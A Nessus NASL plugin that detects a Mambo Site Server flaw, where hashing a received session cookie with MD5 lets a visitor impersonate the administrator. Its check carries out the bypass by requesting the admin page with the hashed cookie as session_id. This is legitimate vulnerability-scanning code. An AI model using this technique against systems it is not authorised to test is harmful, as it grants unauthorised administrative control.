
#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11361);
 script_bugtraq_id(6926);
 script_version ("$Revision: 1.5 $");

 name["english"] = "Mambo Site Server Cookie Validation";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote installation of Mambo Site Server improperly validates the
cookies that are sent back by the user.  As a result, a user may
impersonate the administrator by using the MD5 value of a received
cookie and modify the remote server. 

Solution : Upgrade to Mambo 4.0.12 RC3 or newer.
Risk factor : High";
 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of Mambo's flaw";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2003-2005 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003-2005 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("mambo_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
 dir = matches[2];

 req = http_get(item:string(dir, "/index.php?option=logout"), port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if(res == NULL) exit(0);

 cookie = egrep(pattern:"^Set-Cookie.*sessioncookie", string:res, icase:TRUE);
 if(cookie)
 {
  cookie -= string("\r\n");
  id = ereg_replace(pattern:".*=(.*)", string:cookie, replace:"\1");
  req = http_get(item:string(dir, "/administrator/index2.php?session_id=", hexstr(MD5(id))), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if("Mambo Open Source - Administration" >< res) {
    security_hole(port);
    exit(0);
  }
 }
}
